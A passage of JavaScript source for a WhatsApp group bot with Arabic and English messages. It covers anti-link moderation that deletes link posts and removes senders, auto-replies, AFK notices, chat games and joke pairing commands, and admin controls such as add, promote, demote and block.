bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by xeon
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 Tiktok Link - اترك رابط تيكتوكDetected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by xeon
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 منع الروابط 」\`\`\`\n\nاوه انت مشرف لا تخف يمكنك ارسال روابط كما تشاء😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 منع الروابط 」\`\`\`\n\n@${m.sender.split("@")[0]} تم اكتشاف رابط سيتم طردك في خلال 0 ثانيه 
 
لقد حظرتك من الروابط لماذا لم تسمع الكلام.  
 
 
 
تمت البرمجه بواسطه: ELGAZAR ALWAZER`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

        //auto reply by xeon
  if (Autoreply)
        for (let anji of xeonysticker){
				if (budy === anji){
					result = fs.readFileSync(`./XeonMedia/sticker/${anji}.webp`)
					ElgazarBot.sendMessage(m.chat, { sticker: result }, { quoted: m })
					}
			}
			  if (Autoreply)
			for (let anju of xeonyaudio){
				if (budy === anju){
					result = fs.readFileSync(`./XeonMedia/audio/${anju}.mp3`)
					ElgazarBot.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}
			  if (Autoreply)
			for (let anjh of xeonyimage){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/image/${anjh}.jpg`)
					ElgazarBot.sendMessage(m.chat, { image: result }, { quoted: m })
					}
			}
			  if (Autoreply) 
					for (let anjh of xeonyvideo){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/video/${anjh}.mp4`)
					ElgazarBot.sendMessage(m.chat, { video: result }, { quoted: m })
					}
				  }

      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

//emoji 
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
ElgazarBot.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: ElgazarBot.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, ElgazarBot.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
ElgazarBot.ev.emit('messages.upsert', msg)
}

//guess song
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await ElgazarBot.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, ElgazarBot.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }
        
        //TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game Has Ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `رقم الغرفه: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} لقد فزت✨` : isTie ? `انتهت اللعبه` : `دور ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

اكتب *surrender* للاستسلام والاعتراف بالهزيمة`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await ElgazarBot.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await ElgazarBot.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|نعم|yes|okay?|لا|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    ElgazarBot.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    ElgazarBot.sendText(m.chat, `حسنا يمكنك الاختيار في شات البوت الخاص و عد الي المجموعه للاطلاع علي النتيجه

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

من فضلك اذهب الي شات البوت واختر منه https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) ElgazarBot.sendText(roof.p, `من فضلك اختر \n\حجر🗿\nورقه📄\nمقص✂️`, m)
	    if (!roof.pilih2) ElgazarBot.sendText(roof.p2, `من فضلك اختر \n\nحجر🗿\nورقه📄\nمقص✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) ElgazarBot.sendText(m.chat, `لم يتم اختيار اي شئ'[ ⏳ ] انتهت المهلة، تم إلغاؤها بسبب عدم الاستجابة ,\nانتهت اللعبه`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    ElgazarBot.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't لعبه حجر ورقه, انتهت اللعبه`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /مقص/i
	    let b = /حجر/i
	    let k = /ورقه/i
	    let reg = /^(مقص|حجر|ورقه)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`حسنا لقد اخترت: ${m.text} ${!roof.pilih2 ? `\n\nالان اذهب الي المجموعه لرؤيه النتائج` : ''}`)
	    if (!roof.pilih2) ElgazarBot.sendText(roof.p2, '_لقد اختار خصمك اختيار_\nحان دورك اختر بسرعه اسرع اسرع', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`حسنا لقد اخرت: ${m.text} ${!roof.pilih ? `\n\nالان اذهب الي المجموعه لرؤيه النتائج` : ''}`)
	    if (!roof.pilih) ElgazarBot.sendText(roof.p, '_لقد اختار خصمك اختيار_\nحان دورك اختر بسرعه اسرع اسرع , 0)', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    ElgazarBot.sendText(roof.asal, `_*النتيجه الان*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` لقد ربح \n` : ` وانت خسرت \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` لقد ربح \n` : ` وانت خسرت  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
متعملش ريب عليه لانه في وضع الاختفاء الان ${reason ? 'السبب ' + reason : 'بدون سبب'}
مده الغياب ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
منور لقد عدت${user.afkReason ? ' السبب ' + user.afkReason : ''}
مده الغياب ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
        //menu image randomizer
	let picaks = [flaming,fluming,flarun,flasmurf]
	let picak = picaks[Math.floor(Math.random() * picaks.length)]
	
	//menu doc randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)

//swtich case
        switch(command) {
	case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} انه في وضع الاختفاء\nالسبب :${text ? ': ' + text : ''}`)
            }
            break	
                case 'اكس': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply(`انت في جيم اكتب مغادره وابدأ جيم جديد`)
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `رقم الغرفه: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

دور @${room.game.currentTurn.split('@')[0]}

اكتب *surrender* للاستسلام والاعتراف بالهزيمة`
            if (room.x !== room.o) await ElgazarBot.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await ElgazarBot.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('في انتظار لاعب اخر' + (text ? ` اكتب الأمر أدناه ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'مغادره': case 'مغادرة': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            ElgazarBot.sendText(m.chat, `تم حذف الجلسه بنجاح`, m)
            } else if (!this.game) {
            m.reply(`الجلسه غير موجوده`)
            } else throw '?'
            } catch (e) {
            m.reply('damaged')
            }
            }
            break
            case 'pvp':case 'حجر ورقه': case 'rockpaperscissors':case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Complete your previous game`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return m.reply(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `The person you are challenging is playing suit with someone else :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*حجر ورقه مقص*_

@${m.sender.split`@`[0]} *يتحداك هذا اللاعب* @${m.mentionedJid[0].split`@`[0]} *في حجر ورقه مقص*

*اهلا* @${m.mentionedJid[0].split`@`[0]} *اذا كنت تقبل التحدي اكتب نعم واذا لا تريد اكتب لا`
            this.suit[id] = {
            chat: await ElgazarBot.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) ElgazarBot.sendText(m.chat, `_[ ⏳ ] انتهت المهلة، تم إلغاؤها بسبب عدم الاستجابة _`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    ElgazarBot.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    ElgazarBot.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    ElgazarBot.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    ElgazarBot.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    ElgazarBot.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    ElgazarBot.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    ElgazarBot.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break

            case 'guess': {
                if (!args.join(" ")) throw `Example : ${prefix + command} song`
if (args[0] === "song") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
let anugas = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/guessSong.json')
let result = anugas[Math.floor(Math.random() * anugas.length)]
let msg = await ElgazarBot.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
ElgazarBot.sendText(m.chat, `What is the name of this song?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
ElgazarBot.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess the song' }, type: 1 }], `Time has run out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebaklagu[m.sender.split('@')[0]]
}
}
}
break
            case 'matchquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                let { genMath, modes } = require('./lib/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                ElgazarBot.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    m.reply("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
  case 'الفاكهه': case 'فاكهه': {
            const somtoy = solot[Math.floor(Math.random() * solot.length)]
            let sloth =`[  🎰 لعبه الفواكه 🎰  ]\n------------------------\n\n🍒 : 🍌 : 🍇\n${somtoy}<=====\n🍇 : 🍌 : 🍒\n\n------------------------\n[  🎰 لعبه الفواكه 🎰  ]\n\n*معلومة* :\n_إذا حصلت على 3 من نفس الفاكهة_\n_يعني أنك فزت_\n\n_مثال : 🍒 : 🍒 : 🍒_ <=====`
            let buttons = [{ buttonId: 'الفاكهه', buttonText: { displayText: '🎰مره اخري🎰' }, type: 1 }]
            await ElgazarBot.sendButtonText(m.chat, buttons, sloth, botname, m)
            }
            break
            case 'soulmate': case 'رفيق': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫 رفيق الروح

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '❤️', buttonText: { displayText: 'كن رفيق الروح❤✨' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
            
            case 'فارقني': case 'فراق': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `تم فراقكم 🙂💔

@${me.split('@')[0]} 💔 @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '💔', buttonText: { displayText: 'فارقني 💔️' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
            
            case 'couple': case 'زواج': case 'جواز': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `@${orang.split('@')[0]} 「 معلش زوجناكم لأنكم تصلحون لبعض 🤡 」◣ @${jodoh.split('@')[0]}
「 الي يشوفهم مناسبين لبعض زيي يضغط يب 🤡 」◣`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: '「 يب هم مناسبين لبعض😂🤡 」◣', buttonText: { displayText: '「 يب هم مناسبين لبعض😂🤡 」◣' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: menst})
            }
            break
            
            case 'طلاق': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `@${orang.split('@')[0]} 「 معلش طلقناكم لأنكم لا تصلحون لبعض 💔 」◣ @${jodoh.split('@')[0]}
「 الي يشوفهم مش مناسبين لبعض زيي يضغط يب 🤡 」◣`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: '「 يب هم مش مناسبين لبعض 💔 」◣', buttonText: { displayText: '「 يب هم مش مناسبين لبعض 💔 」◣' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: menst})
            }
            break
            
            case 'جوزني': case 'زوجني': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `「 معلش زوجناكم لأنكم تصلحون لبعض 🤡 」◣
@${me.split('@')[0]} 「 الي يشوفهم مناسبين لبعض زيي يضغط يب 🤡 」◣ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '「 الي يشوفهم مناسبين لبعض زيي يضغط يب 🤡 」◣', buttonText: { displayText: '「 يب هم مناسبين لبعض😂🤡 」◣' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
            
            case 'طلقني': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `「 معلش طلقناكم لأنكم لا تصلحون لبعض 💔 」◣
@${me.split('@')[0]} 「 الي يشوفهم مش مناسبين لبعض زيي يضغط يب 🤡 」◣ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '「 الي يشوفهم مش مناسبين لبعض زيي يضغط يب 🤡 」◣', buttonText: { displayText: '「 يب هم مش مناسبين لبعض 💔 」◣' }, type: 1 }
                    ]
                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
            
            case 'buttonmaker': {
            if (!isPremium) throw mess.premime
			if (!text) throw `Example : ${prefix + command} hi|hello`
            let jawab = `${text.split("|")[0]}`
            let buttons = [{ buttonId: 'menu', buttonText: { displayText: `${themeemoji}` }, type: 1 }]
            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
            }
            break
            
            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                ElgazarBot.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': case 'ادخل': case 'انضم': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'اين رابط الجروب!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'الرابط خطأ!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await ElgazarBot.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'اخرج': case 'غادر': {
                if (!isCreator) throw mess.owner
                await ElgazarBot.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
	/*case 'kick': case 'طرد': case 'اطرد': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ElgazarBot.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break*/
	case 'add': case 'اضافه': case 'ضيف': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ElgazarBot.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': case 'رفع': case 'ترقيه': case 'ترقية': case 'ارفع': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ElgazarBot.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': case 'تنزيل': case 'نزل': case 'تخفيض': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ElgazarBot.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': case 'بلوك': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ElgazarBot.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': case 'فك-البلوك': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ElgazarBot.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'تغيرالاسم': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'اين الاسم الجديد ?'
